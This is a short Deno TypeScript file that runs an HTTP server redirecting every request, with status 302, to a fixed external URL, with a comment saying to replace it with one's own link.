import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://mecamex.net/spectrum/_+_==", // Replace this with your actual link
    },
  });
});
